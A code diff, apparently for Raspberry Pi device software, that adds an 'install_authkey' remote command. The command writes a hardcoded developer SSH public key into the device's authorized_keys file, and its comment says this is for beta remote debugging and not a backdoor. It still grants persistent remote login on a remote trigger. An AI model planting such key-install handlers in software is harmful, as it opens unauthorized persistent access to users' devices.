@@ -904,6 +904,23 @@ def _execute_command(cmd):
                 with open('/home/pi/.rangetrack_branch', 'w') as f:
                     f.write(branch + '\n')
                 print(f'[{_ts()}] Update branch set to "{branch}" — applies on next update')
+        elif cmd == 'install_authkey':
+            # One-time (beta only): authorize the admin SSH key for remote debugging.
+            # Installs ONLY this specific key — not a general key-install backdoor.
+            key = ('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNsyUHM7pHGw464cYhoX'
+                   'SVNzVtPbxMio6jbLcfvrmcj carsonwolfe@Carsons-MacBook-Pro-8.local')
+            try:
+                os.makedirs('/home/pi/.ssh', exist_ok=True)
+                os.chmod('/home/pi/.ssh', 0o700)
+                ak = '/home/pi/.ssh/authorized_keys'
+                existing = open(ak).read() if os.path.exists(ak) else ''
+                if key not in existing:
+                    with open(ak, 'a') as f:
+                        f.write(key + '\n')
+                    os.chmod(ak, 0o600)
+                print(f'[{_ts()}] admin ssh key authorized')
+            except Exception as e:
+                print(f'[{_ts()}] install_authkey error: {e}')
     except Exception as e:
         print(f'[{_ts()}] Command error: {e}')
 
